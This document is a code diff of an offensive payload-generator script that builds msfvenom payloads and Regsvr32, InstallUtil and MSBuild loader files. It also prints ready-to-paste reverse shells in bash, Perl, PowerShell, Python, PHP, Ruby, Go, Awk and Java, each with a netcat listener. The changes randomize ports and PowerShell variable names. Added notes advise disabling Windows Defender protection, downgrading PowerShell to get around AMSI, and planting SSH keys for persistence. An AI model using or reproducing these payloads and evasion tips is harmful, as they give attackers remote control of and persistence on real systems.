@@ -26,32 +26,42 @@ class bcolors:
 listener_ip = "127.0.0.1"
 #assumed wired interface
 interface = "eth0"
+#assumed wireless interface
+winterface = "wlan0"
+#Install location
+loc = os.getcwd()
 #Malware output file
-targetfile = "./aMALgamation/current/"
+targetfile = loc + "/aMALgamation/current/"
+
+#Random Port
+def randomPort(stringLength=5):
+  number = '54321'
+  return ''.join(random.choice(number) for i in range(stringLength))
+
 # 32 bit MET Port
-METRT32_PORT = "443"
+METRT32_PORT = randomPort(4)
 # 32 bit MET Stageless Port
-METRT32_SL_PORT = "444"
+METRT32_SL_PORT = randomPort(4)
 # 64 bit MET Port
-METRT64_PORT = "8443"
+METRT64_PORT = randomPort(4)
 # 64 bit MET Stageless Port
-METRT64_SL_PORT = "8444"
+METRT64_SL_PORT = randomPort(4)
 # 32 bit SHELL Port
-SHELL32_PORT = "8080"
+SHELL32_PORT = randomPort(4)
 # 64 bit SHELL Port
-SHELL64_PORT = "8181"
+SHELL64_PORT = randomPort(4)
 # 32 bit SHELL Stageless Port
-SHELL32_SL_PORT = "8081"
+SHELL32_SL_PORT = randomPort(4)
 # 64 bit SHELL Stageless Port
-SHELL64_SL_PORT = "8282"
+SHELL64_SL_PORT = randomPort(4)
 # Python MET Port
-METPY_PORT = "88"
+METPY_PORT = randomPort(4)
 # Python SHELL Port
-SHELLPY_PORT = "89"
+SHELLPY_PORT = randomPort(4)
 # OSX 32 bit SHELL Port
-SHELLOS32_PORT = "98"
+SHELLOS32_PORT = randomPort(4)
 # OSX 64 bit SHELL Port
-SHELLOS64_PORT = "99"
+SHELLOS64_PORT = randomPort(4)
 
 
 
@@ -92,19 +102,23 @@ if not os.path.exists(targetfile):
 today = time.strftime("%Y%m%d-%H%M")
 
 
-archivefolder = "./aMALgamation/archive" + today
+archivefolder = loc + "/aMALgamation/archive" + today
 try:
     os.makedirs(archivefolder)
 except OSError as e:
     if e.errno != errno.EEXIST:
         raise
-files = os.listdir(targetfile)
-for f in files:
-    shutil.move(targetfile+f, archivefolder)
-#Random Strings
+def archFile():
+  files = os.listdir(targetfile)
+  for f in files:
+      shutil.move(targetfile+f, archivefolder)
+  print(bcolors.ERROR + bcolors.BOLD + "\t\tAll content in {0} being moved to {1}\n".format(targetfile, archivefolder) + bcolors.ENDC)
+
+#Random Letter Strings
 def randomString(stringLength=6):
   letters = string.ascii_letters
   return ''.join(random.choice(letters) for i in range(stringLength))
+
 
 def get_local_ip(iface):
   try:
@@ -379,7 +393,7 @@ def gen_340():
   os.system("msfvenom -p " + SHELL32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + SHELL32_PORT + "  --platform win -a x86 EXITFUNC=thread  -f raw 2>/dev/null | base64 >" + targetfile + "340-SHELL32.b64")
 
 
-  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg MET  BAT file...")
+  print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating 32 bit Reg Shell BAT file...")
   shellreg32_bat_file = open(targetfile + "341-Reg-SHELL-32.bat", "w")
   shellreg32_bat_file.write("""cmd /k c:\Windows\System32\Regsvr32.exe /s /i:shellcode,http://%s/340-SHELL32.b64 322-WEV_x86.dll
 """ % listener_ip)
@@ -501,7 +515,8 @@ def gen_400():
   psinst_bat_file = open(targetfile + "404-InstallUtil-PS.bat", "w")
   psinst_bat_file.write(r"cmd /k c:\Windows\Microsoft.NET\Framework\v4.0.30319\Installutil.exe /logfile= /logtoconsole=false 403-PS-installutil.exe")
   psinst_bat_file.close()
-  print(bcolors.ERROR + bcolors.BOLD + "***THE InstallUtil PowerShell Payload has errors***" + bcolors.ENDC)
+  print(bcolors.ERROR + bcolors.BOLD + "***THE InstallUtil PowerShell Payload will only work if AMSI is disabled***" + bcolors.ENDC)
+def gen_401():
   print(bcolors.BLUE + "[*]" + bcolors.ENDC + " Generating 405 32bit MET Base64 payload -------")
   os.system("msfvenom -p " + METRT32_Payload + " CMD=calc.exe LHOST=" + listener_ip + " LPORT=" + METRT32_PORT + " --platform win -a x86 EXITFUNC=thread -f raw  | base64 >" + targetfile + "405-MET32.b64")
 
@@ -598,8 +613,8 @@ def gen_410():
   print(bcolors.BLUE + "\t[*]" + bcolors.ENDC + " Generating  MSBuild PowerShell XML file...")
 
   PS_script = "$client = New-Object System.Net.Sockets.TCPClient(\'" + listener_ip + "\'," + SHELL32_PORT + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-  b64_script = base64.b64encode(PS_script)
-  print(bcolors.ERROR + bcolors.BOLD + "***THE MSBuild PowerShell Payload has errors***" + bcolors.ENDC)
+  b64_script = base64.b64encode(PS_script.encode()).decode()
+  print(bcolors.ERROR + bcolors.BOLD + "***THE MSBuild PowerShell Payload only work if AMSI is disabled***" + bcolors.ENDC)
   targetname = randomString(7)
   classname = randomString(10)
   payloadname = randomString(8)
@@ -841,9 +856,25 @@ def gen_440():
 
   print(bcolors.ERROR + bcolors.BOLD + "***I still need to create a basic shell and PowerShell payload for Regsvcs ***" + bcolors.ENDC)
 
-##Shells 
+##Shells
 def Shells():
   global listener_ip
+
+  #random ports
+  rp1 = randomPort()
+  rp2 = randomPort()
+  rp3 = randomPort()
+  rp4 = randomPort()
+  rp5 = randomPort()
+  rp6 = randomPort()
+  rp7 = randomPort()
+  rp8 = randomPort()
+  rp9 = randomPort()
+  rp10 = randomPort()
+  rp11 = randomPort()
+  rp12 = randomPort()
+  rp13 = randomPort()
+
   print(bcolors.GREEN + bcolors.BOLD + bcolors.UNDERLINE + "\tLets Play with some Shells!!" + bcolors.ENDC)
   while(1):
     print(bcolors.ERROR + "\t*******************************************************************" + bcolors.ENDC)
@@ -851,116 +882,247 @@ def Shells():
     print("\t(2)\tPERL Reverse Shell --------- (Linux|Unix)")
     print("\t(3)\tPERL Reverse Shell --------- (Windows)")
     print("\t(4)\tPowerShell Reverse Shell --- (Windows)")
-    print("\t(5)\tPython Reverse Shell ------- (Windows|Linx|Unix)")
-    print("\t(6)\tPHP Reverse Shell ---------- (Linux|Unix)")
-    print("\t(7)\tRuby Reverse Shell --------- (Linux|Unix)")
-    print("\t(8)\tRuby Reverse Shell --------- (Windows)")
-    print("\t(9)\tGolang Reverse Shell ------- (Linux|Unix)")
-    print("\t(10)\tAwk Reverse Shell --------- (Linux|Unix)")
-    print("\t(11)\tJava Reverse Shell -------- (Linux|Unix)")
-    print("\t(12)\tJava Reverse Shell -------- (Windows)")
-    print("\t(999)\t Go back to the main menu")
+    print("\t(5)\tPython Reverse Shell ------- (Linx|Unix)")
+    print("\t(6)\tPython Reverse Shell ------- (Windows)")
+    print("\t(7)\tPHP Reverse Shell ---------- (Linux|Unix)")
+    print("\t(8)\tRuby Reverse Shell --------- (Linux|Unix)")
+    print("\t(9)\tRuby Reverse Shell --------- (Windows)")
+    print("\t(10)\tGolang Reverse Shell ------- (Linux|Unix)")
+    print("\t(11)\tAwk Reverse Shell ---------- (Linux|Unix)")
+    print("\t(12)\tJava Reverse Shell --------- (Linux|Unix)")
+    print("\t(13)\tJava Reverse Shell --------- (Windows)")
+    print("\t(99)\tGo back to the main menu")
     print(bcolors.BLUE + "\t*******************************************************************" + bcolors.ENDC)
 
-    options = int(input("\nPiCk a S4e11 bro-pop: "))
+    options = input("\nPiCk a S4e11 bro-pop: ")
 
-    if options == 1:
+    if options == "1":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tBASH SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "bash -i >& /dev/tcp/" + listener_ip + "/1337 0>&1\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "bash -i >& /dev/tcp/" + listener_ip + "/{0} 0>&1\n\n".format(rp1))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tBASH Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1337\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp1))
+        print("\t NOTE:\t  This consitently works. If there is a command injection on a linux based system, this is my go too.\n \t\t If the connection keeps getting dropped I would recommend adding a public key to the authorized_keys in the .ssh folder of the application's user\n")
         print("\t*******************************************************************\n")
-    elif options == 2:
+    elif options == "2":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -e \'use Socket;$i=\"' + listener_ip + '\";$p=1338;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n') 
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -e \'use Socket;$i=\"' + listener_ip + '\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n' % rp2) 
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Linux Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1338\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp2))
+        print("\t NOTE:\t  This  works fine. However, I would use python if that is avalible to you\n")
         print("\t*******************************************************************\n")
-    elif options == 3:
+    elif options == "3":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,' + listener_ip + ':1338\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'\n')
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + 'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,\"' + listener_ip + ':{0}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'\n'.format(rp3))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPerl Windows Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1338\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp3))
+        print("\t NOTE:\t  I would only use this on older boxes that do not have any other execution paths\n")
         print("\t*******************************************************************\n")
-    elif options == 4:
+    elif options == "4":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPowerShell Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "$client = New-Object System.Net.Sockets.TCPClient(\'" + listener_ip +  "\',1339);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n")
+        clientN = randomString(9)
+        streamN = randomString(10)
+        byteN = randomString(8)
+        dataN = randomString(7)
+        sendbackN = randomString(10)
+        iN = randomString()
+        sendback2N = randomString(9)
+        sendbyteN = randomString(12)
+        ps_script = "$" + clientN + " = \"New-Object System.Net.Sockets.TCPClient(\'" + listener_ip +  "\'," + rp4 + ")\";$" + streamN+" = $" + clientN + ".GetStream();[byte[]]$" + byteN + " = 0..65535|%{0};while(($" + iN + " = $" + streamN + ".Read($" + byteN + ", 0, $" + byteN + ".Length)) -ne 0){;$" + dataN + " = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($" + byteN + ",0, $" + iN + ");$" + sendbackN + " = (iex $" + dataN + " 2>&1 | Out-String );$" + sendback2N + " = $" + sendbackN + " + \'PS \' + (pwd).Path + \'> \';$" + sendbyteN + " = ([text.encoding]::ASCII).GetBytes($" + sendback2N + ");$" + streamN + ".Write($" + sendbyteN + ",0,$" + sendbyteN + ".Length);$" + streamN + ".Flush()};$" + clientN + ".Close()\n"
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + ps_script)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPowerShell Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1339\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp4))
+        print("\t NOTE:\t In newer versions of PowerShell AMSI will prevent this script from running. You will have to do one of two things: \n \t\t 1. If administrator disable it, with 'Set-MpPreference -DisableIOAVProtection $True' \n\t\t 2. Run the script in  verions 1 or 2 with the -v 1 or -v 2. .NET v2.0.50727 is required\n")
         print("\t*******************************************************************\n")
-    elif options == 5:
-        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Reverse  SHELL\n\n***\n" + bcolors.ENDC)
+    elif options == "5":
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Linux Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n") 
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "-c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + listener_ip + "\', 1340)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(\'except\', (), {\'__enter__\': lambda self: None, \'__exit__\': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(\'try\', (), {\'__enter__\': lambda self: None, \'__exit__\': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[\'p2s_thread\'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[\'s2p_thread\'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[\'p\'] in [(subprocess.Popen([\'\\windows\\system32\\cmd.exe\'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[\'s\'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[\'p2s\'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[\'s\'].send(__l[\'p\'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[\'s\'], __l[\'p\'] in [(s, p)]][0])({}), \'p2s\')]][0] for __g[\'s2p\'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[\'p\'].stdin.write(__l[\'data\']), __after())[1] if (len(__l[\'data\']) > 0) else __after())(lambda: __this()) for __l[\'data\'] in [(__l[\'s\'].recv(1024))]][0] if True else __after())())(lambda: None) for __l[\'s\'], __l[\'p\'] in [(s, p)]][0])({}), \'s2p\')]][0] for __g[\'os\'] in [(__import__(\'os\', __g, __g))]][0] for __g[\'socket\'] in [(__import__(\'socket\', __g, __g))]][0] for __g[\'subprocess\'] in [(__import__(\'subprocess\', __g, __g))]][0] for __g[\'threading\'] in [(__import__(\'threading\', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(\'contextlib\'))\"\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'" %(listener_ip, rp5))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1340\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp5))
+        print("\t NOTE:\t  This is a go to shell if python is avalible\n")
         print("\t*******************************************************************\n")
-    elif options == 6:
+    elif options == "6":
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Windows Reverse SHELL\t\t***\n" + bcolors.ENDC)
+        print("\t*******************************************************************\n") 
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "python -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('%s', %s)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"" %(listener_ip, rp6))
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPython Listener\t\t***\n" + bcolors.ENDC)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp6))
+        print("\t NOTE:\t This shell works both on Python3 and Python2. You will need to make sure that python is installed. Since python will not trip an AV\n\t (Only applicaton whitelisting will pervent) this is a great method to establish a shell when other things are being monitored.\n")
+        print("\t*******************************************************************\n")
+    elif options == "7":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "php -r \'$sock=fsockopen(\"" + listener_ip +  "\",1341);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'\n")
-        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP Listener\t\t***\n" + bcolors.ENDC)  
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1341\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "php -r \'$sock=fsockopen(\"" + listener_ip +  "\",{0});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'\n".format(rp7))
+        print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tPHP Listener\t\t***\n" + bcolors.ENDC)
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp7))
+        print("\t NOTE:\t This shell should be used if there is LFI or a place within a PHP application where you can create a file within the web root.\n")
         print("\t*******************************************************************\n")
-    elif options == 7:
+    elif options == "8":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'exit if fork;c=TCPSocket.new(\"" + listener_ip + "\",\"1342\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e\'f=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'\n".format(listener_ip, rp8))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Linux Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1342\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp8))
+        print("\t NOTE:\t This shell works fine. However, python is normally a better choice.\n")
         print("\t*******************************************************************\n")
-    elif options == 8:
+    elif options == "9":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'c=TCPSocket.new(\"" + listener_ip  + "\",\"1343\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "ruby -rsocket -e \'c=TCPSocket.new(\"" + listener_ip  + "\",\"%s\");while(cmd=c.gets);Open3.popen(cmd,\"r\"){|io|c.print io.read}end\'\n" % rp9)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tRuby Windows Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1343\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp9))
+        print("\t NOTE:\t This shell whould require ruby to be installed on the Windows box.\n")
         print("\t*******************************************************************\n")
-    elif options == 9:
+    elif options == "10":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tGoLang Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + listener_ip  + ":1344\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + listener_ip  + ":%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n" % rp10)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tGoLang Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1344\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp10))
+        print("\t NOTE:\t This shell would only be used if nothing else is avaible and GoLang is.\n")
         print("\t*******************************************************************\n")
-    elif options == 10:
+    elif options == "11":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n") 
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "awk \'BEGIN {s = \"/inet/tcp/0/" + listener_ip + "/1345\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + "awk \'BEGIN {s = \"/inet/tcp/0/" + listener_ip + "/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null\n" % rp11)
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tAwk Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1345\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp11))
+        print("\t NOTE:\t This shell would work great when you are on a linux box and the normal shell paths are blocked.\n")
         print("\t*******************************************************************\n")
-    elif options == 11:
+    elif options == "12":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n")
         print(bcolors.BLUE + bcolors.BOLD + "\tCopy payload: " + bcolors.ENDC + """
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/1346;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-""" % listener_ip)
+""" %(listener_ip, rp12))
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Linux Listener\t\t***\n" + bcolors.ENDC)
-        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp 1346\n\n\n")
+        print(bcolors.BLUE + bcolors.BOLD + "\tCopy NetCat listener: " + bcolors.ENDC + "nc -nvlp {0}\n\n\n".format(rp12))
+        print("\t NOTE:\t Use this shell when you have access to a Java based web application and the OS in use is Linux. Things like Jinkens, etc..\n")
         print("\t*******************************************************************\n")
-    elif options == 12:
+    elif options == "13":
         print(bcolors.BOLD + bcolors.UNDERLINE + bcolors.GREEN + "***\t\tJava Windows Reverse  SHELL\t\t***\n" + bcolors.ENDC)
         print("\t*******************************************************************\n") 
